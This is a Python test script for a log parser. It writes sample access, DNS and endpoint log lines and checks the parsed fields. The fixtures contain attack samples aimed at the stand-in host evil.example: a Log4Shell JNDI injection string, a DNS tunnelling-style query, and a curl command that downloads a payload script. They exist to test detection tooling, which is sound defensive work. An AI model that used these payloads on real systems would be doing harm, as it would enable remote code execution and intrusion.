from __future__ import annotations

import json
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.parser.log_parser import parse_access_log, parse_dns_log, parse_endpoint_log


def main() -> None:
    tmp = PROJECT_ROOT / "data" / "tmp"
    tmp.mkdir(parents=True, exist_ok=True)

    access = tmp / "access.log"
    access.write_text(
        '10.10.10.5 - - [27/Jun/2026:06:40:00 +0000] "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1" 200 2 "-" "curl/8.0"\n',
        encoding="utf-8",
    )
    access_events = parse_access_log(access)
    assert len(access_events) == 1
    assert access_events[0].method == "GET"
    assert access_events[0].status_code == 200
    assert access_events[0].src_ip == "10.10.10.5"

    dns = tmp / "dns.jsonl"
    dns.write_text(
        json.dumps(
            {
                "timestamp": "2026-06-27T06:40:30Z",
                "src_ip": "10.10.10.20",
                "dst_ip": "8.8.8.8",
                "query": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example",
                "qtype": "TXT",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    dns_events = parse_dns_log(dns)
    assert len(dns_events) == 1
    assert dns_events[0].protocol == "DNS"
    assert dns_events[0].dns_qtype == "TXT"

    endpoint = tmp / "endpoint.csv"
    endpoint.write_text(
        "timestamp,host,process_name,command_line,dst_ip,dst_port\n"
        '2026-06-27T06:40:20Z,victim,bash,"bash -c whoami; curl http://evil.example/payload.sh -o /tmp/payload.sh",203.0.113.50,8080\n',
        encoding="utf-8",
    )
    endpoint_events = parse_endpoint_log(endpoint)
    assert len(endpoint_events) == 1
    assert endpoint_events[0].protocol == "ENDPOINT"
    assert "whoami" in endpoint_events[0].payload_clean
    assert endpoint_events[0].dst_port == 8080


if __name__ == "__main__":
    main()
